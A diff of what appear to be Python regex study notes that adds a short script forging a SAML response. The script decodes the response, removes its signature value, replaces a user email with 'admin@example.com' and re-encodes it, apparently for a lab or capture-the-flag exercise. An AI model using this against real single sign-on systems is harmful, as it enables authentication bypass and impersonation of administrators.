@@ -751,6 +751,8 @@ re.findall("[0-9]+", sentence)
 re.search("[0-9]+", sentence)
 #output: <_sre.SRE_Match object; span=(9, 11), match='30'>
 ```
+<br />
+
 ```
 import re
 
@@ -767,6 +769,28 @@ with open('text', 'r') as text:
         for word in words:
             if findCyber(word) != None:
                 binary += findCyber(word)
+```
+
+<br />
+
+```
+#!/usr/bin/python3
+
+import base64
+import re
+import sys
+from urllib.parse import unquote, quote_from_bytes
+
+def saml(data):
+    decoded = (base64.b64decode(unquote(data))).decode()
+    prog = re.compile(r'(?<=<ds:SignatureValue>).*(?=<\/ds:SignatureValue>)')
+    result = str(prog.findall(decoded)).strip("'[]")
+    decoded = decoded.replace(result, "")
+    decoded = decoded.replace("coolio@example.com","admin@example.com")
+    decoded = quote_from_bytes(base64.b64encode(decoded.encode()))
+    print("Result: \n\n", decoded)
+
+saml(sys.argv[1])
 ```
 
 ### CSV MODULE
